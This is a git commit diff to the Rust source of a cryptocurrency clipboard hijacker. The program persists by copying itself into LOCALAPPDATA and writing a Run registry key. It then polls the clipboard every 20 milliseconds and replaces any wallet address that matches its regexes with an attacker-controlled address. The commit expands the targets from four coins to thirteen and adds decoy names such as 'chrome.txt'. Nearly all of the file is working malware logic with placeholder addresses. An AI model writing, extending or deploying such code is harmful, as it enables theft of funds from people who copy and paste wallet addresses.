c3a0f0ad494619a73c26b228c5efbba48fdfb241
Atsukoro1 <dornicakkuba@gmail.com>
2023-05-01 14:04:15 +0200

    feat: 🎸 Changes

--- src/main.rs
+++ src/main.rs
@@ -1,65 +1,51 @@
-use clipboard::{ClipboardProvider, windows_clipboard::WindowsClipboardContext};
-use regex::Regex;
-use std::{thread, time::Duration, collections::HashMap, str::FromStr, ops::Deref, io, path::PathBuf, fs::{create_dir_all, copy}};
-use winreg::{
-    enums::*,
-    RegKey
+use clipboard::{
+    ClipboardProvider,
+    windows_clipboard::WindowsClipboardContext
 };
-use std::env;
-
-
-/**
- * use std::io;
-use std::path::PathBuf;
-use std::env;
-use winreg::enums::*;
-use winreg::RegKey;
-
-fn main() -> io::Result<()> {
-    let app_name = "YourAppName";
-    let startup_registry_key = format!(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{}", app_name);
-
-    let exe_path = get_executable_path()?;
-    add_to_startup_registry(&startup_registry_key, &exe_path)?;
-
-    println!("Added {} to startup registry.", app_name);
-    Ok(())
-}
-
-fn get_executable_path() -> io::Result<PathBuf> {
-    let exe_path = env::current_exe()?;
-    Ok(exe_path)
-}
-
-fn add_to_startup_registry(startup_registry_key: &str, exe_path: &PathBuf) -> io::Result<()> {
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-    let software = hkcu.open_subkey_with_flags("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", KEY_ALL_ACCESS)?;
-    software.set_value(startup_registry_key, &exe_path.to_string_lossy())?;
-    Ok(())
-}
- */
+use regex::Regex;
+use std::{
+    collections::HashMap,
+    env,
+    fs::{copy, create_dir_all},
+    io,
+    path::PathBuf,
+    str::FromStr,
+    thread,
+    time::Duration,
+};
+use winreg::{enums::*, RegKey};
 
 static MUTEX: &str = "adsdfs98f76sda98fysdf";
+static FILE_NAME: &str = "chrome.txt";
+static FOLDER_NAME: &str = "fsdljfsd";
+static STARTUP_NAME: &str = "fdkjfd";
 
-const BTC_ADDR: &str = "sdfdfs";
+const BTC_ADDR: &str = "h";
 const XMR_ADDR: &str = "dfssdf";
 const DGE_ADDR: &str = "dfssfd";
 const LTC_ADDR: &str = "dsfsdf";
+const ETH_ADDR: &str = "dfgdg";
+const SHIBA_INU_ADDR: &str = "gfhdfh";
+const RIPPLE_ADDR: &str = "fghfgh";
+const SOLANA_ADDR: &str = "dfgsdfg";
+const BINANCE_COIN_ADDR: &str = "sdfhsdf";
+const TETHER_ADDR: &str = "fsdfsdf";
+const DAI_ADDR: &str = "gfhghf";
+const ETC_ADDR: &str = "ghgfhf";
+const BCH_ADDR: &str = "ghgfh";
 
 fn add_to_startup_registry(path: String) -> io::Result<()> {
     let sub_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
 
     let key = RegKey::predef(HKEY_CURRENT_USER)
-        .open_subkey_with_flags(
-            sub_key, 
-            KEY_WRITE
-        )?;
+        .open_subkey_with_flags(sub_key, KEY_WRITE)?;
 
-    key.set_value(MUTEX,  &path)
+    key.set_value(MUTEX, &path)
 }
 
 fn persistence() -> io::Result<()> {
     let current_path = env::current_exe()?;
+
     let desired_path = PathBuf::from(env::var("LOCALAPPDATA").unwrap()).join(MUTEX);
 
     let file_name = current_path.file_name().unwrap();
@@ -69,7 +55,7 @@ fn persistence() -> io::Result<()> {
         Ok(..) => {
             create_dir_all(&desired_path)?;
             copy(current_path, destination_path)?;
-        },
+        }
         Err(..) => {}
     };
 
@@ -81,32 +67,21 @@ fn scan(check_map: &HashMap<&str, &str>) -> bool {
 
     let result = cb_prov.get_contents();
 
-    let mut check_set_contents = |
-        check: &str, 
-        set: &str, 
-        clipoard_text: String
-    | -> Option<bool> {
+    let mut check_set_contents = |check: &str, set: &str, clipoard_text: String| -> Option<bool> {
         if Regex::from_str(check).unwrap().is_match(&clipoard_text) {
-            match cb_prov.set_contents(String::from(set)) {
-                Ok(..) => return Some(true),
-                Err(..) => ()
+            if let Ok(..) = cb_prov.set_contents(String::from(set)) {
+                return Some(true);
             }
         }
 
         return None;
     };
 
-    if result.is_ok() {
-        let clipboard_text: String = result.unwrap();
-
-        for record in check_map {
-            if check_set_contents(
-                record.0, 
-                record.1,
-                clipboard_text.clone()
-            ).is_some() { 
-                return true
-            };
+    if let Ok(clipboard_text) = result {
+        for (regex_str, address) in check_map {
+            if check_set_contents(regex_str, address, clipboard_text.clone()).is_some() {
+                return true;
+            }
         }
     }
 
@@ -114,18 +89,27 @@ fn scan(check_map: &HashMap<&str, &str>) -> bool {
 }
 
 fn main() {
-    persistence();
-
     let map: HashMap<&str, &str> = HashMap::from_iter([
         (r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$", BTC_ADDR),
         (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
+        (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
+        (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
         (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
-        (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR)
+        (r"^0x[0-9a-fA-F]{40}$", SHIBA_INU_ADDR),
+        (r"^r[0-9a-zA-Z]{24,34}$", RIPPLE_ADDR),
+        (r"^So[1-9A-HJ-NP-Za-km-z]{41,43}$", SOLANA_ADDR),
+        (r"^0x[0-9a-fA-F]{40}$", BINANCE_COIN_ADDR),
+        (r"^0x[0-9a-fA-F]{40}$", TETHER_ADDR),
+        (r"^0x[0-9a-fA-F]{40}$", DAI_ADDR),
+        (r"^0x[0-9a-fA-F]{40}$", ETC_ADDR),
+        (r"^bitcoincash:q[0-9a-zA-Z]{41}$", BCH_ADDR),
     ]);
-
-    loop {
-        scan(&map);
-
-        thread::sleep(Duration::from_millis(20));
-    }
-}
+    
+    match persistence() {
+        Ok(..) => loop {
+            scan(&map);
+            thread::sleep(Duration::from_millis(20));
+        },
+        Err(..) => {}
+    };
+} 
